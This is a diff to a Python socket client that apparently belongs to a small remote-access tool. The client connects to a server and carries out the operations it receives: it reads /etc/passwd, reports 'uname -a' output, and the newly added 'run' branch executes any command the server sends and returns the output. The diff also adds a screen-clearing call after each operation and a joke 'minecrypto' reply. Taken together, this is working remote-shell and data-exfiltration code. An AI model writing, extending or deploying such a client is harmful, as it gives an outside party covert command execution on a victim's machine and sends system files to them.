@@ -19,7 +19,7 @@ class color:
 
 s = socket.socket()
 
-print(" [" + color.OKBLUE + "i" + color.ENDC + "] Trying to connect to the server...")
+print(" [" + color.OKBLUE + "i" + color.ENDC + "] Client started.")
 
 try:
     s.connect((HOST, PORT))
@@ -31,6 +31,7 @@ except:
 while True:
     op = s.recv(1024).decode("utf-8")
     print(" [" + color.OKBLUE + "i" + color.ENDC + "] Operation received:", op)
+    os.popen("clear")
     if op == "getpasswd":
         stream = os.popen('cat /etc/passwd')
         cat = stream.read()
@@ -48,6 +49,21 @@ while True:
         except:
             print(" [" + color.FAIL + "!" + color.ENDC + "] There was an error.")
 
+
+    elif op == "minecrypto":
+        s.send(str.encode(" Mining crypto now! TO THE MOON!!!!"))
+
+
+    elif op == "getinfo":
+        stream = os.popen('uname -a')
+        output = stream.read()
+        s.send(str.encode(output))
+
+    elif op == "run":
+        command = s.recv(2048).decode("utf-8")
+        stream = os.popen(command)
+        output = stream.read()
+        s.send(str.encode(output))
 
     elif op == "!EXIT":
         exit()
